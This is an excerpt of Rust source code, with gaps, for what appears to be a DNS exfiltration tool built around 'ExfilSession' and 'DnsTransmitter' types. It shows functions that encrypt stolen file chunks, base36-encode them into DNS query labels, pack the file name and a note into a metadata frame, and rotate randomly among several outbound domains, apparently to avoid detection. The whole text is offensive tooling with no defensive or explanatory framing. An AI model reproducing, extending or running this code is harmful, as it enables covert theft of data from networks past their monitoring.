...
impl DnsTransmitter {
    ...
    pub fn send_chunk(&mut self, session: &ExfilSession, index: usize, chunk: &[u8]) -> Result<()> {
        let frame_index: u32 = index
            .checked_add(1)
            .ok_or_else(|| anyhow!("chunk index overflow"))?
            .try_into()
            .map_err(|_| anyhow!("chunk index exceeds u32"))?;
    ...
    fn build_metadata_label(
        ...
        let payload = if self.cfg.encrypted {
            encrypt(&buf, &self.aes_key).map_err(|e| anyhow!("{e}"))?
        } else {
            buf
        };
        let encoded = base36::encode(&payload);
    ...
    fn build_payload_labels(&self, bytes: &[u8]) -> Result<Vec<String>> {
        let payload = if self.cfg.encrypted {
            encrypt(bytes, &self.aes_key).map_err(|e| anyhow!("{e}"))?
        } else {
            bytes.to_vec()
        };
        let encoded = base36::encode(&payload);
    ...
    fn select_domain(&mut self) -> String {
        ...
        let normalize = |d: &str| d.trim().trim_end_matches('.').to_string();

        if domains.len() == 1 {
            let d = normalize(&domains[0]);
            self.last_domain = Some(d.clone());
            return d;
        }

        let mut rng = rand::thread_rng();
        let normalized: Vec<String> = domains.iter().map(|s| normalize(s)).collect();
        let mut candidates: Vec<&str> = normalized.iter().map(|s| s.as_str()).collect();
        if let Some(last) = &self.last_domain {
            candidates.retain(|d| *d != last.as_str());
            if candidates.is_empty() {
                candidates = normalized.iter().map(|s| s.as_str()).collect();
            }
        }
...
pub(crate) fn build_metadata_payload(session: &ExfilSession) -> Vec<u8> {
    ...
    let name_trunc = truncate_utf8(&session.job.file_name, 63);
    buf.push(name_trunc.len() as u8);
    buf.extend_from_slice(name_trunc.as_bytes());

    let note_trunc = truncate_utf8(&session.job.note, 63);
    buf.push(note_trunc.len() as u8);
    buf.extend_from_slice(note_trunc.as_bytes());
    buf
}
